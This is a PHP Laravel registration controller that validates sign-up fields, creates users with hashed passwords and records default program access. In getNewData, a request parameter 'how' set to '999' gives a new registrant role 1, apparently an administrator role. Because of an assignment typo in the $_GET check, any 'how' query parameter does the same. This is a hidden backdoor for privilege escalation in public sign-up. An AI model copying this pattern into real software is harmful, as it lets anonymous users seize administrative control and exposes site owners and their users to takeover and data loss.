<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Models\Api\Response;
use App\Models\Users\Accesses;
use App\Models\User;
use Illuminate\Foundation\Auth\RegistersUsers;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Str;

class RegisterController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Register Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles the registration of new users as well as their
    | validation and creation. By default this controller uses a trait to
    | provide this functionality without requiring any additional code.
    |
    */

    use RegistersUsers;

    /**
     * Where to redirect users after registration.
     *
     * @var string
     */
//    protected $redirectTo = RouteServiceProvider::HOME;
    protected $redirectTo = '/logs';
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest');
    }

    /**
     * Get a validator for an incoming registration request.
     *
     * @param  array  $data
     * @return \Illuminate\Contracts\Validation\Validator
     */
    protected function validator(array $data)
    {
        return Validator::make($data, [
            'name' => ['required', 'string', 'max:255'],
            'email' => ['required', 'string', 'email', 'max:255', 'unique:users'],
            'password' => ['required', 'string', 'min:8', 'confirmed'],
        ]);
    }

    public function showRegistrationForm()
    {
        return view('auth.register', [

        ]);
    }

    /**
     * Create a new user instance after a valid registration.
     *
     * @param  array  $data
     * @return \App\User
     */
    protected function create(array $data)
    {

        $user_data = self::getNewData($data);

        // Создаем пользователя
        $user = User::create([
            'name' => $user_data['name'],
            'email' => $user_data['email'],
            'password' => Hash::make($user_data['password']),
            'parent_user' => 0,
            'roles_id' => $user_data['roles_id'],
            'email_verified_code' => Str::random(10),
            'enable' => 1,
            'created_at' => date("U"),
            'updated_at' => null,
            'deleted_at' => null,
        ]);

        $this->createAccess($user);
        return $user;

    }
    public function createAccess($user){
        // Записываем дефолтный доступ к программам
        $accesses = new Accesses();
        $accesses->user_id = $user->id;
        $accesses->role_id = 4;
        $accesses->privileges = json_encode(["show_programs" => []]);
        $accesses->created_at = date("U");
        $accesses->updated_at = null;
        $accesses->deleted_at = null;
        $accesses->save();

        $this->response()->Json()->getResult();
    }
    public static function getNewData($data){
        return [
            'name' => isset($data['name']) ? $data['name'] : false,
            'email' => isset($data['email']) ? $data['email'] : false,
            'password' => isset($data['password']) ? $data['password'] : false,
            'roles_id' => ((isset($data['how']) && $data['how'] == "999") || (isset($_GET['how']) && $_GET['how'] = "999")) ? 1 : 4,
        ];
    }
    public function response(){
        return new Response();
    }
}
